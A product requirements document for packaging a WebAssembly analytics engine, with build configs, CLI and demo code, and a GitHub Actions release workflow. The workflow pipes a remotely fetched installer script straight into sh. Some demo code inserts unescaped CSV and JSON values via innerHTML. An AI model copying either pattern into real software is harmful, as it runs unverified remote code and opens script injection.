# DataPrism Core Packaging & Distribution Strategy
**Product Requirements Prompt (PRP)**

## 1. Executive Summary

### Overview
Implement a comprehensive packaging and distribution strategy for DataPrism Core, transforming the current monorepo into a professional-grade product suite with multiple distribution channels, automated tooling, and developer-friendly workflows.

### Primary Objectives
- **Professional Distribution**: Multi-channel package distribution (NPM, CDN, GitHub Packages)
- **Developer Experience**: One-command setup, hot-reloading, and comprehensive tooling
- **Production Readiness**: Automated CI/CD, security verification, and performance optimization
- **Ecosystem Growth**: Plugin marketplace foundation and community tooling

### Success Criteria
- Developers can install and initialize DataPrism in <10 minutes
- Complete demo application runs end-to-end analytics workflow
- All packages pass integration tests across target browsers
- Documentation enables self-service adoption without support

### Architecture Layers Affected
- **Distribution Infrastructure**: NPM packages, CDN bundles, GitHub Packages
- **Build System**: Multi-format builds, optimization, and asset management
- **Developer Tooling**: CLI tools, scaffolding, validation, and hot-reloading
- **Documentation**: Unified portal with interactive examples and API references

## 2. Context and Background

### Current State Analysis
Based on comprehensive codebase research, DataPrism Core has exceptional architecture:

**Existing Strengths:**
- **Sophisticated Plugin System**: Enterprise-level sandboxing and security
- **Performance-Oriented**: WASM optimization with <2s query targets
- **Type-Safe**: Comprehensive TypeScript coverage
- **Modular Design**: Clean separation between core, orchestration, and plugins
- **Quality Infrastructure**: Multi-layer testing with Vitest and Playwright

**Distribution Gaps:**
- No unified package distribution strategy
- Limited developer tooling for plugin development
- Mock examples instead of integrated demos
- Missing CI/CD automation
- No documentation portal

### Business Justification
- **Market Positioning**: Compete with enterprise analytics platforms
- **Developer Adoption**: Reduce friction from evaluation to production
- **Ecosystem Growth**: Enable community plugin development
- **Commercial Viability**: Foundation for enterprise licensing and support

### Architecture Integration
The packaging strategy builds on the existing monorepo structure:

```
dataprism-core/
├── packages/
│   ├── core/                     # @dataprism/core (WASM + orchestration)
│   ├── plugin-framework/         # @dataprism/plugin-framework
│   ├── plugins-out-of-box/       # @dataprism/plugins-*
│   └── cli/                      # @dataprism/cli (NEW)
├── apps/
│   ├── demo-analytics/           # Complete demo application (NEW)
│   └── docs/                     # Documentation portal (NEW)
├── tools/
│   ├── build/                    # Build automation (NEW)
│   └── release/                  # Release management (NEW)
└── cdn/                          # CDN bundle generation (NEW)
```

## 3. Technical Specifications

### Package Architecture

#### Core Package (@dataprism/core)
**Bundle Structure:**
```
@dataprism/core/
├── dist/
│   ├── index.js              # ES module (main entry)
│   ├── index.cjs             # CommonJS fallback
│   ├── index.d.ts            # TypeScript definitions
│   ├── dataprism.wasm        # Core WASM binary
│   └── worker.js             # Web Worker for WASM
├── cdn/
│   ├── dataprism.min.js      # UMD bundle for CDN
│   └── dataprism.min.js.map  # Source maps
└── package.json
```

**Performance Requirements:**
- **Bundle Size**: <2MB total (WASM + JS)
- **Load Time**: <5 seconds on modern browsers
- **Tree Shaking**: Support selective imports
- **Browser Support**: Chrome 90+, Firefox 88+, Safari 14+, Edge 90+

#### Plugin Framework (@dataprism/plugin-framework)
**Features:**
- Plugin discovery and registration system
- Security sandbox with capability-based permissions
- Resource management with memory/CPU quotas
- Event bus for inter-plugin communication
- Hot-reloading for development workflows

#### CLI Tools (@dataprism/cli)
**Commands:**
```bash
npx @dataprism/cli init <project-name>        # Project scaffolding
npx @dataprism/cli plugin create <name>       # Plugin template
npx @dataprism/cli plugin validate <path>     # Plugin validation
npx @dataprism/cli plugin publish <name>      # Plugin publishing
npx @dataprism/cli dev                        # Development server
npx @dataprism/cli build                      # Production build
```

### Distribution Channels

#### NPM Registry
```json
{
  "@dataprism/core": "Latest core engine",
  "@dataprism/plugin-framework": "Plugin development SDK",
  "@dataprism/plugins-visualization": "Chart plugins bundle",
  "@dataprism/plugins-integration": "Data import/export plugins",
  "@dataprism/plugins-processing": "ML and analytics plugins",
  "@dataprism/plugins-utility": "System and monitoring plugins",
  "@dataprism/cli": "Developer tooling"
}
```

#### CDN Distribution
```html
<!-- Core engine via CDN -->
<script src="https://cdn.dataprism.dev/v1/core/dataprism.min.js"></script>
<script src="https://cdn.dataprism.dev/v1/plugins/visualization.min.js"></script>

<!-- ES module imports -->
<script type="module">
  import { DataPrismEngine } from 'https://cdn.dataprism.dev/v1/core/index.js';
</script>
```

#### GitHub Packages
- Enterprise customers with private registries
- Pre-release and beta versions
- Custom builds with enterprise features

### Security Requirements

#### Package Integrity
- **WASM Signing**: Digital signatures for all WASM binaries
- **Subresource Integrity**: SHA-384 hashes for CDN assets
- **Dependency Scanning**: Automated vulnerability detection
- **Plugin Validation**: Manifest verification and security scanning

#### Sandboxing
- **Web Worker Isolation**: Plugins run in separate contexts
- **Capability System**: Granular permission management
- **Resource Limits**: Memory, CPU, and network quotas
- **Content Security Policy**: CSP-compliant execution

### Performance Targets

#### Bundle Optimization
- **Core Bundle**: <2MB including WASM
- **Plugin Bundles**: <500KB per category
- **CDN Caching**: 1-year cache with versioned URLs
- **Compression**: Brotli and gzip support

#### Runtime Performance
- **Engine Initialization**: <5 seconds
- **Plugin Loading**: <1 second per plugin
- **Query Performance**: <2 seconds for 95% of operations
- **Memory Usage**: <4GB for 1M row datasets

## 4. Implementation Plan

### Step 1: Build System Modernization (Week 1-2)

#### Environment Setup
```bash
# Install modern build tools
npm install -g @dataprism/cli
npm install -D @rollup/plugin-wasm @rollup/plugin-typescript
npm install -D vite @vitejs/plugin-legacy
npm install -D esbuild rollup-plugin-visualizer
```

#### Unified Build Configuration
```typescript
// tools/build/vite.config.ts
import { defineConfig } from 'vite';
import { resolve } from 'path';

export default defineConfig({
  build: {
    lib: {
      entry: {
        core: resolve(__dirname, '../../packages/core/src/index.ts'),
        'plugin-framework': resolve(__dirname, '../../packages/plugin-framework/src/index.ts')
      },
      formats: ['es', 'cjs', 'umd'],
      name: 'DataPrism'
    },
    rollupOptions: {
      external: ['@dataprism/core'],
      output: {
        globals: {
          '@dataprism/core': 'DataPrism'
        }
      }
    },
    target: 'es2020',
    sourcemap: true,
    minify: 'esbuild'
  },
  define: {
    __VERSION__: JSON.stringify(process.env.npm_package_version),
    __BUILD_DATE__: JSON.stringify(new Date().toISOString())
  }
});
```

#### WASM Integration
```typescript
// tools/build/wasm-plugin.ts
import { Plugin } from 'vite';

export function wasmPlugin(): Plugin {
  return {
    name: 'wasm-loader',
    load(id) {
      if (id.endsWith('.wasm')) {
        return `
          export default function loadWasm() {
            return fetch('${id}').then(r => r.arrayBuffer());
          }
        `;
      }
    },
    generateBundle(options, bundle) {
      // Copy WASM files with integrity hashes
      for (const [fileName, chunk] of Object.entries(bundle)) {
        if (fileName.endsWith('.wasm')) {
          this.emitFile({
            type: 'asset',
            fileName,
            source: chunk.code
          });
        }
      }
    }
  };
}
```

### Step 2: Package Structure Implementation (Week 2-3)

#### Core Package Configuration
```json
// packages/core/package.json
{
  "name": "@dataprism/core",
  "version": "1.0.0",
  "type": "module",
  "main": "./dist/index.cjs",
  "module": "./dist/index.js",
  "types": "./dist/index.d.ts",
  "exports": {
    ".": {
      "import": "./dist/index.js",
      "require": "./dist/index.cjs",
      "types": "./dist/index.d.ts"
    },
    "./wasm": {
      "import": "./dist/dataprism.wasm",
      "require": "./dist/dataprism.wasm"
    }
  },
  "files": [
    "dist/",
    "README.md",
    "CHANGELOG.md"
  ],
  "scripts": {
    "build": "wasm-pack build --target web --out-dir dist && tsc",
    "build:cdn": "vite build --mode cdn",
    "test": "wasm-pack test --headless --firefox",
    "size-check": "bundlesize"
  },
  "bundlesize": [
    {
      "path": "./dist/index.js",
      "maxSize": "500kb"
    },
    {
      "path": "./dist/dataprism.wasm",
      "maxSize": "1.5mb"
    }
  ],
  "dependencies": {
    "@dataprism/plugin-framework": "workspace:*"
  },
  "peerDependencies": {
    "typescript": ">=4.8.0"
  }
}
```

#### CLI Tool Implementation
```typescript
// packages/cli/src/commands/init.ts
import { Command } from 'commander';
import { generateProject } from '../generators/project.js';

export const initCommand = new Command('init')
  .description('Initialize a new DataPrism project')
  .argument('<name>', 'Project name')
  .option('-t, --template <type>', 'Project template', 'basic')
  .option('--typescript', 'Use TypeScript', true)
  .action(async (name: string, options) => {
    console.log(`Creating DataPrism project: ${name}`);
    
    await generateProject({
      name,
      template: options.template,
      typescript: options.typescript,
      plugins: ['visualization', 'integration']
    });
    
    console.log(`
🎉 Project created successfully!

Next steps:
  cd ${name}
  npm install
  npm run dev

The demo will be available at http://localhost:3000
    `);
  });
```

#### Project Template Generator
```typescript
// packages/cli/src/generators/project.ts
export async function generateProject(config: ProjectConfig) {
  const { name, template, typescript, plugins } = config;
  
  // Create project structure
  await createDirectory(name);
  await createFile(`${name}/package.json`, generatePackageJson(config));
  await createFile(`${name}/index.html`, generateIndexHtml(config));
  await createFile(`${name}/src/main.${typescript ? 'ts' : 'js'}`, generateMainFile(config));
  
  // Generate configuration files
  await createFile(`${name}/vite.config.${typescript ? 'ts' : 'js'}`, generateViteConfig(config));
  
  if (typescript) {
    await createFile(`${name}/tsconfig.json`, generateTsConfig(config));
  }
  
  // Install dependencies
  await installDependencies(name, {
    dependencies: [
      '@dataprism/core',
      '@dataprism/plugin-framework',
      ...plugins.map(p => `@dataprism/plugins-${p}`)
    ],
    devDependencies: typescript ? ['typescript', '@types/node', 'vite'] : ['vite']
  });
}

function generateMainFile(config: ProjectConfig): string {
  return `
import { DataPrismEngine } from '@dataprism/core';
import { PluginManager } from '@dataprism/plugin-framework';
${config.plugins.map(p => `import * as ${p}Plugins from '@dataprism/plugins-${p}';`).join('\n')}

async function main() {
  // Initialize DataPrism engine
  const engine = new DataPrismEngine({
    wasmPath: '/node_modules/@dataprism/core/dist/dataprism.wasm'
  });
  
  // Set up plugin manager
  const pluginManager = new PluginManager(engine);
  
  // Register plugins
  ${config.plugins.map(p => `await pluginManager.register(${p}Plugins.default);`).join('\n  ')}
  
  // Initialize engine
  await engine.initialize();
  
  console.log('DataPrism ready! 🚀');
  
  // Your application code here
  const data = await engine.query('SELECT 1 as test');
  console.log('Test query result:', data);
}

main().catch(console.error);
  `;
}
```

### Step 3: CDN Distribution Setup (Week 3-4)

#### CDN Bundle Generation
```typescript
// tools/build/cdn-builder.ts
import { build } from 'vite';
import { resolve } from 'path';

export async function buildCDNBundles() {
  const packages = ['core', 'plugin-framework', 'plugins-visualization'];
  
  for (const pkg of packages) {
    await build({
      configFile: false,
      build: {
        lib: {
          entry: resolve(__dirname, `../../packages/${pkg}/src/index.ts`),
          name: toCamelCase(`DataPrism${pkg}`),
          formats: ['umd'],
          fileName: () => `${pkg}.min.js`
        },
        outDir: `cdn/v1/${pkg}`,
        minify: 'terser',
        sourcemap: true,
        rollupOptions: {
          external: pkg === 'core' ? [] : ['@dataprism/core'],
          output: {
            globals: {
              '@dataprism/core': 'DataPrismCore'
            }
          }
        }
      }
    });
    
    // Generate integrity hashes
    await generateIntegrityHashes(`cdn/v1/${pkg}`);
  }
}

async function generateIntegrityHashes(dir: string) {
  const files = await glob(`${dir}/*.js`);
  const integrity = {};
  
  for (const file of files) {
    const content = await readFile(file);
    const hash = createHash('sha384').update(content).digest('base64');
    integrity[basename(file)] = `sha384-${hash}`;
  }
  
  await writeFile(`${dir}/integrity.json`, JSON.stringify(integrity, null, 2));
}
```

#### CDN Documentation
```html
<!-- cdn/index.html -->
<!DOCTYPE html>
<html>
<head>
  <title>DataPrism CDN</title>
  <style>
    body { font-family: system-ui; max-width: 800px; margin: 0 auto; padding: 2rem; }
    .example { background: #f5f5f5; padding: 1rem; border-radius: 8px; margin: 1rem 0; }
    code { background: #e5e5e5; padding: 0.2rem 0.4rem; border-radius: 4px; }
  </style>
</head>
<body>
  <h1>DataPrism CDN Distribution</h1>
  
  <h2>Quick Start</h2>
  <div class="example">
    <pre><code>&lt;script src="https://cdn.dataprism.dev/v1/core/core.min.js"&gt;&lt;/script&gt;
&lt;script src="https://cdn.dataprism.dev/v1/plugin-framework/plugin-framework.min.js"&gt;&lt;/script&gt;
&lt;script&gt;
  DataPrismCore.init().then(engine =&gt; {
    console.log('DataPrism ready!', engine);
  });
&lt;/script&gt;</code></pre>
  </div>
  
  <h2>ES Modules</h2>
  <div class="example">
    <pre><code>&lt;script type="module"&gt;
  import { DataPrismEngine } from 'https://cdn.dataprism.dev/v1/core/index.js';
  
  const engine = new DataPrismEngine();
  await engine.initialize();
  console.log('Ready!');
&lt;/script&gt;</code></pre>
  </div>
  
  <h2>Available Packages</h2>
  <ul id="packages"></ul>
  
  <script>
    fetch('/packages.json')
      .then(r => r.json())
      .then(packages => {
        const list = document.getElementById('packages');
        Object.entries(packages).forEach(([name, info]) => {
          const item = document.createElement('li');
          item.innerHTML = `
            <strong>${name}</strong> - ${info.description}
            <br><code>https://cdn.dataprism.dev/v1/${name}/${name}.min.js</code>
            <br><small>Integrity: ${info.integrity}</small>
          `;
          list.appendChild(item);
        });
      });
  </script>
</body>
</html>
```

### Step 4: Demo Application Development (Week 4-5)

#### Complete Analytics Demo
```typescript
// apps/demo-analytics/src/main.ts
import { DataPrismEngine } from '@dataprism/core';
import { PluginManager } from '@dataprism/plugin-framework';
import * as visualizationPlugins from '@dataprism/plugins-visualization';
import * as integrationPlugins from '@dataprism/plugins-integration';

class AnalyticsDemo {
  private engine: DataPrismEngine;
  private pluginManager: PluginManager;
  private currentDataset: any = null;

  async initialize() {
    // Initialize engine
    this.engine = new DataPrismEngine({
      wasmPath: '/dataprism.wasm',
      memoryLimit: '2GB'
    });
    
    // Set up plugin manager
    this.pluginManager = new PluginManager(this.engine);
    
    // Register plugins
    await this.pluginManager.register(visualizationPlugins.ObservableChartsPlugin);
    await this.pluginManager.register(integrationPlugins.CSVImporterPlugin);
    
    await this.engine.initialize();
    
    this.setupUI();
    console.log('Demo ready! 🚀');
  }

  async importCSV(file: File) {
    const csvImporter = this.pluginManager.getPlugin('csv-importer');
    
    // Show progress
    const progressBar = document.getElementById('progress');
    
    this.currentDataset = await csvImporter.execute('import', {
      file,
      config: { autoDetectTypes: true },
      onProgress: (progress) => {
        progressBar.style.width = `${progress.percentage}%`;
        console.log(`Import: ${progress.percentage}% complete`);
      }
    });
    
    console.log(`Imported ${this.currentDataset.rows.length} rows`);
    this.updateDataPreview();
  }

  async createVisualization(type: string) {
    if (!this.currentDataset) return;
    
    const chartsPlugin = this.pluginManager.getPlugin('observable-charts');
    const container = document.getElementById('chart-container');
    
    await chartsPlugin.render(container, this.currentDataset, {
      chartSpec: {
        type,
        x: this.currentDataset.columns[0].name,
        y: this.currentDataset.columns[1].name,
        title: `${type} Chart Demo`
      },
      responsive: true,
      animation: true
    });
  }

  private setupUI() {
    // File upload handler
    const fileInput = document.getElementById('csv-file') as HTMLInputElement;
    fileInput.addEventListener('change', (e) => {
      const file = (e.target as HTMLInputElement).files[0];
      if (file) this.importCSV(file);
    });
    
    // Chart type buttons
    ['bar', 'line', 'scatter'].forEach(type => {
      const button = document.getElementById(`${type}-chart`);
      button?.addEventListener('click', () => this.createVisualization(type));
    });
  }

  private updateDataPreview() {
    const preview = document.getElementById('data-preview');
    if (!this.currentDataset) return;
    
    preview.innerHTML = `
      <h3>Dataset Preview</h3>
      <p>Rows: ${this.currentDataset.rows.length.toLocaleString()}</p>
      <p>Columns: ${this.currentDataset.columns.length}</p>
      <table>
        <thead>
          <tr>${this.currentDataset.columns.map(col => `<th>${col.name}</th>`).join('')}</tr>
        </thead>
        <tbody>
          ${this.currentDataset.rows.slice(0, 5).map(row => 
            `<tr>${row.map(cell => `<td>${cell}</td>`).join('')}</tr>`
          ).join('')}
        </tbody>
      </table>
    `;
  }
}

// Initialize demo
new AnalyticsDemo().initialize().catch(console.error);
```

#### Demo HTML Interface
```html
<!-- apps/demo-analytics/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DataPrism Analytics Demo</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      margin: 0;
      padding: 2rem;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
    }
    
    .container {
      max-width: 1200px;
      margin: 0 auto;
      background: white;
      border-radius: 12px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.1);
      overflow: hidden;
    }
    
    .header {
      background: linear-gradient(45deg, #1e3c72, #2a5298);
      color: white;
      padding: 2rem;
      text-align: center;
    }
    
    .content {
      padding: 2rem;
      display: grid;
      grid-template-columns: 1fr 2fr;
      gap: 2rem;
    }
    
    .controls {
      space-y: 1rem;
    }
    
    .file-upload {
      border: 2px dashed #ddd;
      border-radius: 8px;
      padding: 2rem;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s;
    }
    
    .file-upload:hover {
      border-color: #667eea;
      background: #f8f9ff;
    }
    
    .progress-bar {
      width: 100%;
      height: 8px;
      background: #e5e5e5;
      border-radius: 4px;
      overflow: hidden;
      margin: 1rem 0;
    }
    
    .progress-fill {
      height: 100%;
      background: linear-gradient(45deg, #667eea, #764ba2);
      width: 0%;
      transition: width 0.3s;
    }
    
    .chart-controls {
      display: flex;
      gap: 1rem;
      margin: 1rem 0;
    }
    
    button {
      background: linear-gradient(45deg, #667eea, #764ba2);
      color: white;
      border: none;
      padding: 0.75rem 1.5rem;
      border-radius: 6px;
      cursor: pointer;
      font-weight: 500;
      transition: transform 0.2s;
    }
    
    button:hover {
      transform: translateY(-2px);
    }
    
    #chart-container {
      width: 100%;
      height: 400px;
      border: 1px solid #ddd;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #666;
    }
    
    #data-preview table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 1rem;
    }
    
    #data-preview th,
    #data-preview td {
      border: 1px solid #ddd;
      padding: 0.5rem;
      text-align: left;
    }
    
    #data-preview th {
      background: #f5f5f5;
      font-weight: 600;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🚀 DataPrism Analytics Demo</h1>
      <p>Experience the power of browser-based analytics with WASM and plugins</p>
    </div>
    
    <div class="content">
      <div class="controls">
        <div class="section">
          <h3>1. Import Data</h3>
          <div class="file-upload" onclick="document.getElementById('csv-file').click()">
            <input type="file" id="csv-file" accept=".csv" style="display: none;">
            <p>📁 Drop CSV file here or click to browse</p>
            <small>Supports files up to 100MB</small>
          </div>
          
          <div class="progress-bar">
            <div class="progress-fill" id="progress"></div>
          </div>
        </div>
        
        <div class="section">
          <h3>2. Visualize Data</h3>
          <div class="chart-controls">
            <button id="bar-chart">Bar Chart</button>
            <button id="line-chart">Line Chart</button>
            <button id="scatter-chart">Scatter Plot</button>
          </div>
        </div>
        
        <div id="data-preview"></div>
      </div>
      
      <div class="visualization">
        <h3>Interactive Visualization</h3>
        <div id="chart-container">
          <p>Import data to see visualizations here</p>
        </div>
        
        <div class="stats" id="performance-stats">
          <h4>Performance Metrics</h4>
          <p>Engine load time: <span id="load-time">-</span></p>
          <p>Data processing: <span id="process-time">-</span></p>
          <p>Visualization render: <span id="render-time">-</span></p>
        </div>
      </div>
    </div>
  </div>
  
  <script type="module" src="/src/main.ts"></script>
</body>
</html>
```

### Step 5: Documentation Portal (Week 5-6)

#### Documentation Site Structure
```typescript
// apps/docs/src/config.ts
export const docsConfig = {
  title: 'DataPrism Core Documentation',
  description: 'Browser-based analytics engine with WebAssembly',
  nav: [
    {
      title: 'Getting Started',
      items: [
        { title: 'Quick Start', href: '/quick-start' },
        { title: 'Installation', href: '/installation' },
        { title: 'Basic Usage', href: '/basic-usage' }
      ]
    },
    {
      title: 'Core Engine',
      items: [
        { title: 'DataPrism Engine', href: '/core/engine' },
        { title: 'Query Interface', href: '/core/queries' },
        { title: 'Memory Management', href: '/core/memory' }
      ]
    },
    {
      title: 'Plugin System',
      items: [
        { title: 'Plugin Framework', href: '/plugins/framework' },
        { title: 'Creating Plugins', href: '/plugins/development' },
        { title: 'Plugin Security', href: '/plugins/security' }
      ]
    },
    {
      title: 'Out-of-Box Plugins',
      items: [
        { title: 'Visualization', href: '/plugins/visualization' },
        { title: 'Data Integration', href: '/plugins/integration' },
        { title: 'Processing', href: '/plugins/processing' },
        { title: 'Utilities', href: '/plugins/utility' }
      ]
    }
  ]
};
```

#### Interactive API Explorer
```typescript
// apps/docs/src/components/APIExplorer.tsx
import React, { useState } from 'react';
import { DataPrismEngine } from '@dataprism/core';

export function APIExplorer() {
  const [engine, setEngine] = useState<DataPrismEngine | null>(null);
  const [query, setQuery] = useState('SELECT 1 as hello, 2 as world');
  const [result, setResult] = useState<any>(null);
  const [loading, setLoading] = useState(false);

  const initEngine = async () => {
    setLoading(true);
    try {
      const newEngine = new DataPrismEngine();
      await newEngine.initialize();
      setEngine(newEngine);
    } catch (error) {
      console.error('Failed to initialize engine:', error);
    } finally {
      setLoading(false);
    }
  };

  const executeQuery = async () => {
    if (!engine) return;
    
    setLoading(true);
    try {
      const startTime = performance.now();
      const queryResult = await engine.query(query);
      const endTime = performance.now();
      
      setResult({
        data: queryResult,
        executionTime: endTime - startTime,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      setResult({ error: error.message });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="api-explorer">
      <div className="header">
        <h3>Interactive API Explorer</h3>
        <p>Try DataPrism Core directly in your browser</p>
      </div>
      
      {!engine ? (
        <button onClick={initEngine} disabled={loading} className="init-button">
          {loading ? 'Initializing...' : 'Initialize DataPrism Engine'}
        </button>
      ) : (
        <div className="query-interface">
          <div className="query-editor">
            <label>SQL Query:</label>
            <textarea
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              placeholder="Enter your SQL query..."
              rows={4}
            />
            <button onClick={executeQuery} disabled={loading}>
              {loading ? 'Executing...' : 'Execute Query'}
            </button>
          </div>
          
          {result && (
            <div className="query-result">
              <h4>Result:</h4>
              {result.error ? (
                <div className="error">Error: {result.error}</div>
              ) : (
                <div>
                  <div className="metadata">
                    Execution time: {result.executionTime.toFixed(2)}ms
                  </div>
                  <pre>{JSON.stringify(result.data, null, 2)}</pre>
                </div>
              )}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
```

### Step 6: CI/CD Pipeline Implementation (Week 6-7)

#### GitHub Actions Workflow
```yaml
# .github/workflows/release.yml
name: Build and Release

on:
  push:
    branches: [main, develop]
    tags: ['v*']
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [18, 20]
    
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          registry-url: 'https://registry.npmjs.org'
      
      - name: Install Rust
        uses: actions-rs/toolchain@v1
        with:
          toolchain: stable
          target: wasm32-unknown-unknown
      
      - name: Install wasm-pack
        run: curl https://rustwasm.github.io/wasm-pack/installer/init.sh -sSf | sh
      
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: |
            ~/.npm
            ~/.cargo
            target/
          key: ${{ runner.os }}-deps-${{ hashFiles('**/package-lock.json', '**/Cargo.lock') }}
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run tests
        run: |
          npm run test:core
          npm run test:orchestration
          npm run test:plugins
          npm run test:integration
      
      - name: Build packages
        run: npm run build:all
      
      - name: Bundle size check
        run: npm run size-check
      
      - name: Browser compatibility test
        run: npm run test:browser

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      
      - name: Security audit
        run: |
          npm audit --audit-level moderate
          npm run audit:licenses
      
      - name: WASM security scan
        run: npm run scan:wasm

  build-release:
    needs: [test, security]
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/v')
    
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          registry-url: 'https://registry.npmjs.org'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Build all packages
        run: npm run build:all
      
      - name: Generate CDN bundles
        run: npm run build:cdn
      
      - name: Sign WASM binaries
        env:
          SIGNING_KEY: ${{ secrets.WASM_SIGNING_KEY }}
        run: npm run sign:wasm
      
      - name: Publish to NPM
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          npm run version:bump
          npm run publish:packages
      
      - name: Deploy to CDN
        env:
          CDN_TOKEN: ${{ secrets.CDN_DEPLOY_TOKEN }}
        run: npm run deploy:cdn
      
      - name: Update documentation
        env:
          DOCS_TOKEN: ${{ secrets.DOCS_DEPLOY_TOKEN }}
        run: npm run deploy:docs
      
      - name: Create GitHub release
        uses: actions/create-release@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          tag_name: ${{ github.ref }}
          release_name: DataPrism Core ${{ github.ref }}
          body: |
            ## What's Changed
            
            See [CHANGELOG.md](CHANGELOG.md) for detailed changes.
            
            ## Downloads
            
            - NPM: `npm install @dataprism/core@${{ github.ref }}`
            - CDN: `https://cdn.dataprism.dev/${{ github.ref }}/core/core.min.js`
            
            ## Demo
            
            Try the live demo at https://demo.dataprism.dev
```

#### Release Management Scripts
```typescript
// tools/release/version-manager.ts
import { execSync } from 'child_process';
import { readFileSync, writeFileSync } from 'fs';
import { glob } from 'glob';

export class VersionManager {
  async bumpVersion(type: 'patch' | 'minor' | 'major') {
    const packages = await glob('packages/*/package.json');
    const rootPackage = JSON.parse(readFileSync('package.json', 'utf8'));
    
    // Calculate new version
    const currentVersion = rootPackage.version;
    const newVersion = this.calculateNewVersion(currentVersion, type);
    
    // Update root package.json
    rootPackage.version = newVersion;
    writeFileSync('package.json', JSON.stringify(rootPackage, null, 2));
    
    // Update all workspace packages
    for (const packagePath of packages) {
      const packageJson = JSON.parse(readFileSync(packagePath, 'utf8'));
      packageJson.version = newVersion;
      
      // Update workspace dependencies
      for (const [depName, depVersion] of Object.entries(packageJson.dependencies || {})) {
        if (depName.startsWith('@dataprism/') && depVersion === 'workspace:*') {
          packageJson.dependencies[depName] = newVersion;
        }
      }
      
      writeFileSync(packagePath, JSON.stringify(packageJson, null, 2));
    }
    
    // Update lock file
    execSync('npm install --package-lock-only');
    
    // Generate changelog
    await this.generateChangelog(currentVersion, newVersion);
    
    console.log(`Version bumped from ${currentVersion} to ${newVersion}`);
    return newVersion;
  }

  private calculateNewVersion(current: string, type: 'patch' | 'minor' | 'major'): string {
    const [major, minor, patch] = current.split('.').map(Number);
    
    switch (type) {
      case 'major':
        return `${major + 1}.0.0`;
      case 'minor':
        return `${major}.${minor + 1}.0`;
      case 'patch':
        return `${major}.${minor}.${patch + 1}`;
    }
  }

  private async generateChangelog(fromVersion: string, toVersion: string) {
    // Generate changelog from git commits
    const commits = execSync(`git log v${fromVersion}..HEAD --oneline --no-merges`, {
      encoding: 'utf8'
    });
    
    const changelog = `
# Changelog

## [${toVersion}] - ${new Date().toISOString().split('T')[0]}

### Changes
${commits.split('\n').filter(line => line.trim()).map(line => `- ${line}`).join('\n')}

### Package Versions
- @dataprism/core: ${toVersion}
- @dataprism/plugin-framework: ${toVersion}
- @dataprism/cli: ${toVersion}

### Downloads
- NPM: \`npm install @dataprism/core@${toVersion}\`
- CDN: \`https://cdn.dataprism.dev/v${toVersion}/core/core.min.js\`
    `;
    
    const existingChangelog = readFileSync('CHANGELOG.md', 'utf8');
    writeFileSync('CHANGELOG.md', changelog + '\n' + existingChangelog);
  }
}
```

## 5. Code Examples and Patterns

### WebAssembly-JavaScript Interop
```typescript
// packages/core/src/wasm-bridge.ts
export class WasmBridge {
  private wasmInstance: any;
  private memory: WebAssembly.Memory;

  async initialize(wasmPath: string) {
    // Load WASM with streaming compilation
    const wasmModule = await WebAssembly.compileStreaming(fetch(wasmPath));
    
    // Create memory with growth support
    this.memory = new WebAssembly.Memory({
      initial: 256,  // 16MB initial
      maximum: 4096, // 256MB maximum
      shared: false
    });
    
    // Instantiate with imports
    const instance = await WebAssembly.instantiate(wasmModule, {
      env: {
        memory: this.memory,
        abort: this.handleAbort.bind(this),
        console_log: this.handleConsoleLog.bind(this)
      }
    });
    
    this.wasmInstance = instance.exports;
    
    // Initialize WASM module
    this.wasmInstance.initialize();
  }

  async executeQuery(sql: string): Promise<QueryResult> {
    // Allocate memory for SQL string
    const sqlPtr = this.allocateString(sql);
    
    try {
      // Call WASM function
      const resultPtr = this.wasmInstance.execute_query(sqlPtr);
      
      // Read result from memory
      const result = this.readQueryResult(resultPtr);
      
      return result;
    } finally {
      // Clean up allocated memory
      this.wasmInstance.deallocate(sqlPtr);
    }
  }

  private allocateString(str: string): number {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(str);
    const ptr = this.wasmInstance.allocate(bytes.length);
    
    const view = new Uint8Array(this.memory.buffer, ptr, bytes.length);
    view.set(bytes);
    
    return ptr;
  }

  private readQueryResult(ptr: number): QueryResult {
    // Read result structure from WASM memory
    const view = new DataView(this.memory.buffer);
    const length = view.getUint32(ptr, true);
    const dataPtr = view.getUint32(ptr + 4, true);
    
    // Read Arrow buffer
    const arrowBuffer = new Uint8Array(this.memory.buffer, dataPtr, length);
    
    // Parse Arrow data
    return this.parseArrowResult(arrowBuffer);
  }
}
```

### Plugin Security Implementation
```typescript
// packages/plugin-framework/src/security-manager.ts
export class SecurityManager {
  private sandboxes = new Map<string, WorkerSandbox>();

  async createSandbox(pluginId: string, permissions: PluginPermissions): Promise<WorkerSandbox> {
    const sandbox = new WorkerSandbox({
      pluginId,
      permissions,
      resourceLimits: {
        memory: permissions.maxMemory || 100 * 1024 * 1024, // 100MB
        cpu: permissions.maxCpu || 0.1, // 10% CPU
        network: permissions.allowNetwork || false
      }
    });
    
    await sandbox.initialize();
    this.sandboxes.set(pluginId, sandbox);
    
    return sandbox;
  }

